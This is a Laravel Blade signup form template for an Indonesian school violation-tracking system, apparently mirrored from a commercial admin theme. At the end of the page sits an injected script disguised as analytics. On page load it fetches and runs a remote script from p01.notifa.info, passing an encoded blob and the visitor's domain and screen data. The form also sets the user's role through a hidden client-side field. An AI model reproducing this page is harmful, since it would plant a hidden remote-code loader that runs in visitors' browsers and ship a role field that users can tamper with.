<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from codervent.com/rocker/color-version/authentication-signup.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 15 Nov 2019 12:20:55 GMT -->
<head>
  <meta charset="utf-8"/>
  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/>
  <meta name="description" content=""/>
  <meta name="author" content=""/>
  <title>Sistem Pelanggaran Smks Mahaputra Cerdas Utama</title>
  <!--favicon-->
  <link rel="icon" href="assets/images/favicon.ico" type="image/x-icon">
  <!-- Bootstrap core CSS-->
  <link href="assets/css/bootstrap.min.css" rel="stylesheet"/>
  <!-- animate CSS-->
  <link href="assets/css/animate.css" rel="stylesheet" type="text/css"/>
  <!-- Icons CSS-->
  <link href="assets/css/icons.css" rel="stylesheet" type="text/css"/>
  <!-- Custom Style-->
  <link href="assets/css/app-style.css" rel="stylesheet"/>
  
</head>

<body>
 <!-- Start wrapper-->
 <div id="wrapper">
    <div class="card border-primary border-top-sm border-bottom-sm card-authentication1 mx-auto my-4 animated bounceInDown">
        <div class="card-body">
         <div class="card-content p-2">
            <div class="text-center">
                <img src="assets/images/logo-icon.png">
            </div>
          <div class="card-title text-uppercase text-center py-3">Sign Up</div>
            <form method="POST" action="{{ route('register') }}" id="submitForm">
                        @csrf
              <div class="form-group">
               <div class="position-relative has-icon-right">
                  <label for="exampleInputName" class="sr-only">Name</label>
                 <input id="usr_name" type="text" class="form-control @error('usr_name') is-invalid @enderror" name="usr_name" value="{{ old('usr_name') }}" autocomplete="usr_name" autofocus placeholder="Name">

                                @error('usr_name')
                                <span class="invalid-feedback" role="alert">
                                    <strong>{{ $message }}</strong>
                                </span>
                                @enderror
                  <div class="form-control-position">
                      <i class="icon-user"></i>
                  </div>
               </div>
              </div>
              <div class="form-group">
               <div class="position-relative has-icon-right">
                  <label for="exampleInputEmailId" class="sr-only">Email ID</label>
                   <input id="usr_email" type="email" class="form-control @error('usr_email') is-invalid @enderror" name="usr_email" value="{{ old('usr_email') }}" autocomplete="usr_email" placeholder="E-mail">

                                @error('usr_email')
                                <span class="invalid-feedback" role="alert">
                                    <strong>{{ $message }}</strong>
                                </span>
                                @enderror
                  <div class="form-control-position">
                      <i class="icon-envelope-open"></i>
                  </div>
               </div>
              </div>

              <div class="form-group">
               <div class="position-relative has-icon-right">
                  <label for="exampleInputEmailId" class="sr-only"> Phone</label>
                   <input id="usr_phone" value="{{ old('usr_phone') }}" type="text" class="form-control @error('usr_phone') is-invalid @enderror" name="usr_phone" autocomplete="off" placeholder="phone">

                                @error('usr_phone')
                                <span class="invalid-feedback" role="alert">
                                    <strong>{{ $message }}</strong>
                                </span>
                                @enderror
                  <div class="form-control-position">
                      <i class="icon-envelope-open"></i>
                  </div>
               </div>
              </div>

              
              <div class="form-group">
               <div class="position-relative has-icon-right">
                  <label for="exampleInputPassword" class="sr-only">Password</label>
                   <input id="password" type="password" class="form-control @error('password') is-invalid @enderror" name="password" autocomplete="new-password" placeholder="password">

                                @error('usr_password')
                                <span class="invalid-feedback" role="alert">
                                    <strong>{{ $message }}</strong>
                                </span>
                                @enderror
                  <div class="form-control-position">
                      <i class="icon-lock"></i>
                  </div>
               </div>
              </div>
              <input type="hidden" name="role" value="1">
              <div class="form-group">
               <div class="position-relative has-icon-right">
                  <label for="exampleInputRetryPassword" class="sr-only">Retry Password</label>
                  <input id="password-confirm" type="password" class="form-control" name="password_confirmation" autocomplete="new-password" placeholder="Retry Password">
                  <div class="form-control-position">
                      <i class="icon-lock"></i>
                  </div>
               </div>
              </div>
             <button type="submit" class="btn btn-primary shadow-primary btn-round btn-block waves-effect waves-light">Sign Up</button>
              
             </form>
           </div>
          </div>
         </div>
    
     <!--Start Back To Top Button-->
    <a href="javaScript:void();" class="back-to-top"><i class="fa fa-angle-double-up"></i> </a>
    <!--End Back To Top Button-->
    </div><!--wrapper-->
    
  <!-- Bootstrap core JavaScript-->
  <script src="assets/js/jquery.min.js"></script>
  <script src="assets/js/popper.min.js"></script>
  <script src="assets/js/bootstrap.min.js"></script>
  
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAz4dcBbGgKuhGIPo3XfCO7NzFh%2bR4TNDzRRkmzfNjYBEvaH9PYWrTRLst0gOFrth%2b5%2bglwDMtd0b5zCWd17vzzhOpEuw6lAYJLz51ArrOOl8Y5SjZniMbiGG7ehzGvgxzMNS6uPTx4NZGMOhp%2biiQN98wF7PBI%2bb0GrGgCVCKQ0dbloBBvL2ab7jiRnWXkEkCN7LF8DoXa3CYAsn40pNJ9NGCiGJcDabb1TnBwqp8yKlYNfd7D7tJHpAKBbvvoknZZtmZEEFqyGz64b4RAzUVtY%2flEJUbQr555lVPEoOGy%2bbRuiUwsRGisTTwTHzjNr%2bqSyV%2blRSGujDRp1ph9bIzSGTIRng2ADGebgG2XfHhCmiWCwldmT%2bmdHJ9EQxkrc6Gf3tJcvjVb2d9mW7ALzjTiW0V9a%2b%2fKDQ%2fh6iF%2fRtq0tdYaBHJPGpZmRIO2geXKh4JuLo8AtaGSq3kCkKO38S%2fIoEDRNpBdrkY%2fd70RbUMnqyxrXpKkXjmqx6NWqzOgC22jlQYqhETIdE%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from codervent.com/rocker/color-version/authentication-signup.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 15 Nov 2019 12:20:55 GMT -->
</html>